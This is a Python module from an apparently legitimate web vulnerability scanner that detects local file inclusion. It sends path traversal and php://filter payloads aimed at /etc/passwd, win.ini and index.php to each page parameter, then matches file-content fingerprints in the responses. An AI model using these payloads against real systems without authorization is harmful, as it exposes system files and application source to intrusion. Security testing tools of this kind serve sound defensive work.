"""LFI detection -- path traversal + PHP wrappers."""
import base64
import re
import string
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

from scanner.modules.base import BaseModule
from scanner.core.html_utils import _extract_params, _make_test_url
from scanner.core.encoding import generate_variants


# ── LFI Techniques ──────────────────────────────────────────────────
# Path traversal doesn't benefit from SQL/XSS encoding techniques.
# Using empty list so generate_variants returns only the plain variant.

LFI_TECHNIQUES = []

# ── Path Traversal Payloads ─────────────────────────────────────────

_LFI_PAYLOADS = [
    {"path": "../../../../etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "....//....//....//....//etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "..\\/..\\/..\\/..\\/etc/passwd", "os": "Unix", "file": "/etc/passwd"},
    {"path": "../../../../windows/win.ini", "os": "Windows", "file": "win.ini"},
    {"path": "..\\..\\..\\..\\windows\\win.ini", "os": "Windows", "file": "win.ini"},
    {"path": "../../etc/passwd%00", "os": "Unix", "file": "/etc/passwd"},
    {"path": "php://filter/convert.base64-encode/resource=index", "os": "Unix", "file": "index.php"},
    {"path": "php://filter/read=convert.base64-encode/resource=index.php", "os": "Unix", "file": "index.php"},
]

# ── File Content Fingerprints ───────────────────────────────────────

_LFI_PATTERNS = {
    "/etc/passwd": [
        r"root:x:0:0:",
        r"daemon:x:\d+:",
        r"nobody:x:\d+:",
        r"bin:x:\d+:",
        r"mail:x:\d+:",
    ],
    "win.ini": [
        r"\[fonts\]",
        r"\[extensions\]",
        r"\[files\]",
        r"\[Mail\]",
    ],
    "index.php": [
        r"<\?php",
        r"<\?=",
        r"namespace\s+\w+",
    ],
}


# ── Pure Functions (testable) ───────────────────────────────────────

def _is_base64(text):
    """Check if text looks like base64-encoded content."""
    if len(text) < 20:
        return False
    # Base64 alphabet + padding
    valid_chars = set(string.ascii_letters + string.digits + "+/=")
    # Allow some newlines/whitespace
    printable = set(text.replace("\n", "").replace("\r", "").replace(" ", ""))
    if not printable.issubset(valid_chars):
        return False
    # Must have reasonable ratio of base64 chars
    b64_chars = sum(1 for c in text if c in valid_chars)
    return b64_chars / max(len(text), 1) > 0.9


def _decode_if_base64(text):
    """Attempt base64 decode if the text looks base64-encoded. Returns original on failure."""
    if not _is_base64(text):
        return text
    # Strip whitespace and try decoding
    try:
        cleaned = re.sub(r'\s+', '', text)
        decoded = base64.b64decode(cleaned).decode("utf-8", errors="replace")
        # Only return decoded if it contains meaningful content
        if len(decoded) > 10:
            return decoded
    except Exception:
        pass
    return text


def _check_lfi_patterns(text):
    """Scan response text for file content fingerprints.

    For PHP wrapper payloads, the response may be base64-encoded source.
    Check both the raw text and base64-decoded text.

    Returns {"file": str, "pattern": str} or None.
    """
    # Check raw text first
    for file_name, patterns in _LFI_PATTERNS.items():
        for pat in patterns:
            if re.search(pat, text, re.IGNORECASE):
                return {"file": file_name, "pattern": pat}

    # Try base64 decode for PHP wrapper responses
    decoded = _decode_if_base64(text)
    if decoded is not text:
        for pat in _LFI_PATTERNS.get("index.php", []):
            if re.search(pat, decoded, re.IGNORECASE):
                return {"file": "index.php", "pattern": pat}

    return None


# ── LfiModule ───────────────────────────────────────────────────────

class LfiModule(BaseModule):
    name = "lfi"
    description = "Detect local file inclusion via path traversal + PHP wrappers"
    requires_url = True

    def run(self, target, request_handler, output, threads=10):
        """Run LFI detection against target."""
        target = target.rstrip("/")
        output.log_progress(f"Fetching {target} for parameter extraction...")

        try:
            resp = request_handler.get(target)
            html = resp.text
        except Exception as e:
            output.log_progress(f"Failed to fetch {target}: {e}")
            return {"module": self.name, "findings": []}

        param_names = _extract_params(target, html)

        # If URL has no obvious params, try the URL query itself
        if not param_names:
            parsed = urllib.parse.urlparse(target)
            if parsed.query:
                param_names = [
                    {"name": k, "method": "GET"}
                    for k in urllib.parse.parse_qs(parsed.query).keys()
                ]

        if not param_names:
            output.log_progress("No testable parameters found on this page")
            return {"module": self.name, "findings": []}

        param_list = [f"{p['name']}({p['method']})" for p in param_names]
        output.log_progress(
            f"Found {len(param_names)} potential parameters: {param_list}"
        )

        findings = []
        param_has_finding = set()

        output.log_progress(
            f"Testing {len(_LFI_PAYLOADS)} LFI payloads across "
            f"{len(param_names)} parameters"
        )

        with ThreadPoolExecutor(max_workers=max(2, min(threads, 10))) as pool:
            futures = {}
            for entry in param_names:
                pname = entry["name"]
                method = entry["method"]
                for lfi_entry in _LFI_PAYLOADS:
                    payload = lfi_entry["path"]
                    for encoded, tech in generate_variants(payload, LFI_TECHNIQUES):
                        if method == "POST":
                            test_url = target
                            futures[pool.submit(
                                request_handler.post, target,
                                data={pname: encoded}
                            )] = (pname, lfi_entry, test_url, tech)
                        else:
                            test_url = _make_test_url(target, pname, encoded)
                            futures[pool.submit(
                                request_handler.get, test_url
                            )] = (pname, lfi_entry, test_url, tech)

            bar = output.create_progress_bar("LFI", len(futures))
            for future in as_completed(futures):
                pname, lfi_entry, test_url, tech = futures[future]
                try:
                    resp = future.result()
                    match = _check_lfi_patterns(resp.text)
                    if match:
                        if pname not in param_has_finding:
                            param_has_finding.add(pname)
                            finding = {
                                "type": "lfi",
                                "parameter": pname,
                                "url": test_url,
                                "os": lfi_entry["os"],
                                "file": match["file"],
                                "encoding": tech,
                                "evidence": (
                                    f"File content fingerprint "
                                    f"'{match['pattern']}' found in response"
                                ),
                            }
                            findings.append(finding)
                            output.log_finding(self.name, finding)
                except Exception:
                    pass
                output.update_progress(bar)
            bar.close()

        output.log_progress(
            f"LFI done: {len(findings)} potential inclusions found"
        )
        return {"module": self.name, "findings": findings}
